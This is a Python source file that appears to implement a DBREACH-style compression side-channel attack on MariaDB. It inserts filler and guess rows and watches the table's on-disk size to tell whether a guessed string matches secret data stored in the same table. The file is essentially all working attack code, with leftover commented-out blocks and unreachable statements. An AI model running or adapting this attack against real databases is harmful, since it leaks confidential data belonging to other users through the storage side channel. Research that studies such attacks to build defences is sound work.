import utils.mariadb_utils as utils
import dbreacher
import time
import random

class DBREACHerImpl(dbreacher.DBREACHer):
    def __init__(self, controller : utils.MariaDBController, tablename : str, startIdx : int, maxRowSize: int, fillerCharSet : set, compressCharAscii : int):
        dbreacher.DBREACHer.__init__(self, controller, tablename, startIdx, maxRowSize, fillerCharSet, compressCharAscii)
        self.compressibilityScoreReady = False
        self.bytesShrunkForCurrentGuess = 0
        self.rowsAdded = 0 
        self.rowsChanged = [False, False, False, False]
        self.fillersInserted = False

    def reinsertFillers(self) -> bool:
        #self.control.get_table_size(self.table, verbose=True)
        self.compressibilityScoreReady = False
        #print(self.bytesShrunkForCurrentGuess)
        if self.fillersInserted:
            
            for row in range(self.startIdx, self.rowsAdded + self.startIdx - (self.bytesShrunkForCurrentGuess // 100)):
                self.control.update_row(self.table, row, utils.get_compressible_str(200, char = self.compressChar))
            for row in range(self.startIdx, self.rowsAdded + self.startIdx):
                self.control.delete_row(self.table, row)
            
            self.bytesShrunkForCurrentGuess = 0
            self.fillers = [''.join(random.choices(self.fillerCharSet, k=self.maxRowSize)) for _ in range(self.numFillerRows)]
            #self.control.get_table_size(self.table, verbose=True)
            ''' 
            self.fillersInserted = True
            oldSize = self.control.get_table_size(self.table)
         
            # insert first filler row for putting in guesses:
            self.control.update_row(self.table, self.startIdx, self.fillers[0])
            newSize = self.control.get_table_size(self.table)
      
            if newSize > oldSize:
                # table grew too quickly, before we could insert all necessary fillers
                return False
         
            compression_bootstrapper = utils.get_compressible_str(100, char = self.compressChar)
            # insert shrinker rows:
            '''
            '''
            for i in range(1, 4): 
                self.control.insert_row(self.table, self.startIdx + i, compression_bootstrapper + self.fillers[i][100:])
                #self.control.insert_row(self.table, self.startIdx + i, compression_bootstrapper)
                newSize = self.control.get_table_size(self.table)
                if newSize > oldSize:
                    # table grew too quickly, before we could insert all necessary fillers
                    return False

            self.rowsAdded = 3
            '''
            '''
            self.rowsAdded = 1
            # insert filler rows until table grows:
            i = 1
            while newSize <= oldSize:
                #print(self.fillers[i][100:])
                self.control.update_row(self.table, self.startIdx + i, compression_bootstrapper + self.fillers[i][100:])
                #time.sleep(1)
                newSize = self.control.get_table_size(self.table)
                i += 1
                self.rowsAdded += 1
            #print("")
            self.rowsChanged = [False, False, False, False]
            #self.control.insert_row(self.table, self.startIdx + i, compression_bootstrapper + self.fillers[i][100:]) 
            self.control.get_table_size(self.table, verbose=True)
            return True
            '''
        else:
            pass

        return self.insertFillers()

        #success = self.insertFillers()
        #print(success)

    # return True if successful
    def insertFillers(self) -> bool:
        self.fillersInserted = True
        oldSize = self.control.get_table_size(self.table)
        
        # insert first filler row for putting in guesses:
        self.control.insert_row(self.table, self.startIdx, self.fillers[0]) 
        self.rowsAdded = 1
        newSize = self.control.get_table_size(self.table)

        if newSize > oldSize:
            # table grew too quickly, before we could insert all necessary fillers
            return False
        
        compression_bootstrapper = utils.get_compressible_str(100, char = self.compressChar)
        # insert shrinker rows:
        '''
        for i in range(1, 4): 
            self.control.insert_row(self.table, self.startIdx + i, compression_bootstrapper + self.fillers[i][100:])
            #self.control.insert_row(self.table, self.startIdx + i, compression_bootstrapper)
            newSize = self.control.get_table_size(self.table)
            if newSize > oldSize:
                # table grew too quickly, before we could insert all necessary fillers
                return False

        self.rowsAdded = 3
        '''
        # insert filler rows until table grows:
        i = 1
        while newSize <= oldSize: 
            #print(self.fillers[i][100:])
            self.control.insert_row(self.table, self.startIdx + i, compression_bootstrapper + self.fillers[i][100:])
            #time.sleep(1)
            newSize = self.control.get_table_size(self.table)
            i += 1
            self.rowsAdded += 1
        #print("")
        self.rowsChanged = [False, False, False, False]
        #self.control.insert_row(self.table, self.startIdx + i, compression_bootstrapper + self.fillers[i][100:])
        return True

    def insertGuessAndCheckIfShrunk(self, guess : str) -> bool:
        self.compressibilityScoreReady = False
        self.bytesShrunkForCurrentGuess = 0

        # reset first 3 rows to original state before inserting guess:
        if self.rowsChanged[0]:
            self.control.update_row(self.table, self.startIdx, self.fillers[0])
            self.rowsChanged[0] = False
        compression_bootstrapper = utils.get_compressible_str(100, char = self.compressChar)
        for i in range(1, 4):
            if self.rowsChanged[i]:
                self.rowsChanged[i] = False
                self.control.update_row(self.table, self.startIdx + self.rowsAdded - i, compression_bootstrapper + self.fillers[self.rowsAdded - i][100:])
            #self.control.update_row(self.table, self.startIdx + i, compression_bootstrapper)
        
        old_size = self.control.get_table_size(self.table)
        new_first_row = guess + self.fillers[0][len(guess):]
        if new_first_row != self.fillers[0]:
            self.control.update_row(self.table, self.startIdx, new_first_row)
            self.rowsChanged[0] = True
        new_size = self.control.get_table_size(self.table)
        return new_size < old_size

    def getSNoReferenceScore(self, length : int, charSet) -> float:
        refGuess = ''.join(random.choices(charSet, k=length)) 
        shrunk = self.insertGuessAndCheckIfShrunk(refGuess)
        if shrunk:
            raise RuntimeError("Table shrunk too early on insertion of guess")
        while not shrunk:
            shrunk = self.addCompressibleByteAndCheckIfShrunk(refGuess)
        return self.getBytesShrunkForCurrentGuess()

    # raises RuntimeError if table shrinks prematurely
    def getSYesReferenceScore(self, length : int) -> float:
        refGuess = self.fillers[1][100:][:length]
        shrunk = self.insertGuessAndCheckIfShrunk(refGuess)
        if shrunk:
            raise RuntimeError("Table shrunk too early on insertion of guess")
        while not shrunk:
            shrunk = self.addCompressibleByteAndCheckIfShrunk(refGuess)
        return self.getBytesShrunkForCurrentGuess()
    
    def addCompressibleByteAndCheckIfShrunk(self, refGuess, lowBytes=0, highBytes=100) -> bool:
        if highBytes >= lowBytes:
            shrunk = self.insertGuessAndCheckIfShrunk(refGuess)
            midBytes = (lowBytes + highBytes) // 2
            self.bytesShrunkForCurrentGuess = midBytes
            shrunk = self.checkIfShrunk(midBytes)
            if shrunk:
                self.addCompressibleByteAndCheckIfShrunk(refGuess, lowBytes, midBytes-1)
            else:
                self.addCompressibleByteAndCheckIfShrunk(refGuess, midBytes + 1, highBytes)
        self.compressibilityScoreReady = True
        return True  

    def checkIfShrunk(self, bytesShrunkForCurrentGuess) -> bool:
        old_size = self.control.get_table_size(self.table)
        old_row = ''
        if bytesShrunkForCurrentGuess <= 100: 
            self.rowsChanged[1] = True
            compress_str = utils.get_compressible_str(100 + bytesShrunkForCurrentGuess, char = self.compressChar)
            self.control.update_row(self.table, self.startIdx + self.rowsAdded - 1, compress_str + self.fillers[self.rowsAdded - 1][len(compress_str):]) 
            new_size = self.control.get_table_size(self.table)
            if new_size < old_size:
                self.compressibilityScoreReady = True
                return True
            else:
                return False
        elif bytesShrunkForCurrentGuess <= 200: 
            self.rowsChanged[1] = True
            compress_str = utils.get_compressible_str(100 + bytesShrunkForCurrentGuess, char = self.compressChar)
            self.control.update_row(self.table, self.startIdx + self.rowsAdded - 1, compress_str + self.fillers[self.rowsAdded - 1][len(compress_str):]) 
            self.rowsChanged[2] = True
            compress_str = utils.get_compressible_str(bytesShrunkForCurrentGuess, char = self.compressChar) 
            self.control.update_row(self.table, self.startIdx + self.rowsAdded - 2, compress_str + self.fillers[self.rowsAdded - 2][len(compress_str):])
            new_size = self.control.get_table_size(self.table)
            if new_size < old_size:
                self.compressibilityScoreReady = True
                return True
            else:
                return False
        elif bytesShrunkForCurrentGuess <= 300:
            self.rowsChanged[1] = True
            compress_str = utils.get_compressible_str(100 + bytesShrunkForCurrentGuess, char = self.compressChar)
            self.control.update_row(self.table, self.startIdx + self.rowsAdded - 1, compress_str + self.fillers[self.rowsAdded - 1][len(compress_str):]) 
            self.rowsChanged[2] = True
            compress_str = utils.get_compressible_str(bytesShrunkForCurrentGuess, char = self.compressChar) 
            self.control.update_row(self.table, self.startIdx + self.rowsAdded - 2, compress_str + self.fillers[self.rowsAdded - 2][len(compress_str):])
            self.rowsChanged[3] = True
            compress_str = utils.get_compressible_str(bytesShrunkForCurrentGuess - 100, char = self.compressChar)
            self.control.update_row(self.table, self.startIdx + self.rowsAdded - 3, compress_str + self.fillers[self.rowsAdded - 3][len(compress_str):])
            new_size = self.control.get_table_size(self.table)
            if new_size < old_size:
                self.compressibilityScoreReady = True
                return True
            else:
                return False
        else:
            #print("Didn't shrink at all ????")
            raise RuntimeError()
            self.compressibilityScoreReady = True
            return True
        #time.sleep(1)

    def getCompressibilityScoreOfCurrentGuess(self) -> float:
        if self.compressibilityScoreReady:
            return float(1) / float(self.bytesShrunkForCurrentGuess)
        else:
            return None

    def getBytesShrunkForCurrentGuess(self) -> int:
        if self.compressibilityScoreReady:
            return self.bytesShrunkForCurrentGuess
        else:
            return None